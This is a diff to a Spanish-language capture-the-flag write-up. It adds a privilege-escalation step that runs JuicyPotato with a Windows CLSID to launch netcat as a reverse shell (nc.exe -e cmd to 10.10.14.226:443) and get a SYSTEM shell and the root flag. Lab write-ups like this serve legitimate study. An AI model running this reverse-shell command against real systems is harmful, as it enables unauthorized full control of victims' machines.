@@ -101,7 +101,15 @@ También deberemos de copiarnos el [[NETCAT]]
 copy \\10.10.14.226\smbFolder\nc.exe
 ```
 
-Ahora deberemos de ejecutar
+Ahora deberemos de ejecutar [[JUICY-POTATO]] y ponernos en escucha en nuestra maquina atacante
+```shell
+JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a  "/c C:\Windows\Temp\privesc\nc.exe -e cmd 10.10.14.226 443" -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
+```
+
+El uso de `-c` es para utilizar un *CLSID* para poder obtener una shell con *NT AUTHORITY\SYSTEM* usando un *CLSID* de la versión de Windows correspondiente de la maquina encontrada en el propio repositorio de [[JUICY-POTATO]].
+
+Después habremos obtenido una shell de máximos privilegios y podremos obtener la flag de root.
+
 
 
 
